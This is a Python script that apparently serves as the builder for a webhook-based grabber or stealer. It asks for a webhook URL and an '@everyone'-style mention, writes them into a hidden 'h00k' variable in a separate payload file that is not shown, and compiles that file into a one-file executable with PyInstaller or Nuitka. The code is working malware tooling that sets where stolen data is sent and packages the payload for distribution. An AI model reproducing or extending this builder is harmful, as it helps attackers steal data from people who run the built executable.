import subprocess
import colorama
from colorama import Fore
import os
import time
import re
from getpass import getpass
from pystyle import Center

colorama.init(autoreset=True)
os.system("cls" if os.name == "nt" else "clear")

ascii_art = """
    \033[38;2;0;255;255m.____                               __   
    \033[38;2;85;255;255m|    |    __ __  ____  ____   _____/  |_ 
    \033[38;2;170;255;255m|    |   |  |  _/ ____/ __ \\ /    \\   __\\
    \033[38;2;212;255;255m|    |___|  |  \\  \\__\\  ___/|   |  |  |  
    \033[38;2;234;255;255m|_______ |____/ \\___  \\___  |___|  |__|  
    \033[38;2;255;255;255m        \\/          \\/    \\/     \\/     
"""

target_file = "src/asset/main.py"

def replace_hook_in_main():
    while True:
        print(Center.XCenter(ascii_art))

        new_hook = getpass(f"{Fore.RESET}\n \033[38;2;170;255;255m                                                Webhook: ").strip()
        mention = input(f"{Fore.RESET}\n \033[38;2;170;255;255m                                         notice (@here, @everyone): ").strip()
        build_type = input(f"{Fore.RESET}\n \033[38;2;170;255;255m                                         Build [Nuitka/Pyinstaller]: ").strip()

        if not new_hook.startswith("https://"):
            print(f"{Fore.YELLOW}[WARN] {Fore.RESET} The webhook entered is not valid. Please try again.")
            input("Press Enter to continue...")
            os.system("cls" if os.name == "nt" else "clear")
            continue
        
        if not mention.startswith("@"):
            print(f"{Fore.YELLOW}[WARN] {Fore.RESET} The mention should start with '@'. Please try again.")
            continue

        try:
            with open(target_file, "r", encoding="utf-8") as f:
                content = f.read()

            content = re.sub(r'h00k\s*=\s*".*?"', f'h00k = "{new_hook}"', content)
            content = re.sub(r'types\s*=\s*".*?"', f'types = "{mention}"', content)

            with open(target_file, "w", encoding="utf-8") as f:
                f.write(content)

            print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Successfully replaced webhook and mention.")
        
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] {Fore.RESET} File '{target_file}' not found.")
            return
        except IOError as e:
            print(f"{Fore.RED}[ERROR] {Fore.RESET} IO error: {e}")
            return

        break

    os.system("cls" if os.name == "nt" else "clear")

    if build_type.lower() in ["pyinstaller", "p"]:
        confirm = input(f"{Fore.LIGHTCYAN_EX}[INPUT] Build with PyInstaller? [Y/N] ").strip().upper()
        if confirm == "Y":
            build_exe("pyinstaller")
    elif build_type.lower() in ["nuitka", "n"]:
        confirm = input(f"{Fore.LIGHTCYAN_EX}[INPUT] Build with Nuitka? [Y/N] ").strip().upper()
        if confirm == "Y":
            build_exe("nuitka")

def build_exe(method):
    print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Building {target_file} with {method}...")

    try:
        if method == "pyinstaller":
            subprocess.run(["pyinstaller", "--onefile", target_file], check=True)
        elif method == "nuitka":
            subprocess.run(["python", "-m", "nuitka", "--onefile", target_file], check=True)
        print(f"{Fore.GREEN}[SUCCESS] {Fore.RESET} Executable built successfully.")
    except subprocess.CalledProcessError:
        print(f"{Fore.YELLOW}[WARN] {Fore.RESET} Failed to build with {method}.")
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} {method} not found. Install it via pip.")

if __name__ == "__main__":
    replace_hook_in_main()
